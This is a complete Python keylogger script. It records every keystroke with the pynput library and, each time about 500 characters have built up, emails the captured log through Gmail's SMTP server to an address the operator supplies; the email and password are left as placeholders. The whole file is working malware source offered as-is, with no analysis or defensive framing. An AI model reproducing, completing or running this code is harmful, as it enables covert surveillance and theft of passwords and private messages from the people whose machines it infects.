#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import smtplib
import pynput.keyboard
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

class Keylogger:
	def __init__(self, number, email, password):
		self.log = 'Keylogger started'
		self.number = number
		self.email = email
		self.password = password

	def append_log(self, string):
		self.log += string
		if len(self.log) >= self.number:
			self.report()

	def process_key_press(self, key):
		try:
			current_key = str(key.char)
		except AttributeError:
			if key == key.space:
				current_key = ' '
			else:
				current_key = ' ' + str(key) + ' '
		self.append_log(current_key)

	def report(self):
		self.send_mail(self.email, self.password)
		self.log = ''

	def send_mail(self, email, password):
		i = 1
		msg = MIMEMultipart()
		msg['Subject'] = 'Данные'
		body = self.log
		msg.attach(MIMEText(body, 'plain'))
		server = smtplib.SMTP('smtp.gmail.com', 587)
		server.starttls()
		server.login(email, password)
		server.sendmail(email, email, msg.as_string())
		server.quit()

	def start(self):
		keyboard = pynput.keyboard.Listener(on_press = self.process_key_press)
		with keyboard:
			self.report()
			keyboard.join()

startlogger = Keylogger(500, 'email', 'password')
startlogger.start()
